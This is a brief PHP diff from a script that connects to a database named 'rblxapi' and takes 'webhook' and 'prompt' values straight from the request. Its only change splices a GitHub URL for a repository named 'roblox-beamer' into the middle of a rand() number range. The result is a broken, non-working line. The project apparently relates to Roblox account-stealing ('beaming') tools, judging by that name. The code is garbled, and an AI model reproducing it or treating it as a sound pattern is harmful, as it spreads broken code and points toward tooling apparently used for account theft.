@@ -7,7 +7,7 @@
     $dbname = "rblxapi";
     $webhook = $_REQUEST['webhook'];
     $prompt = $_REQUEST['prompt'];
-    $id = rand(10,3433434);
+    $id = rand(10,343343https://github.com/lnfernal/roblox-beamer.git4);
 
     // Create connection
     $conn = new mysqli($servername, $username, $password, $dbname);
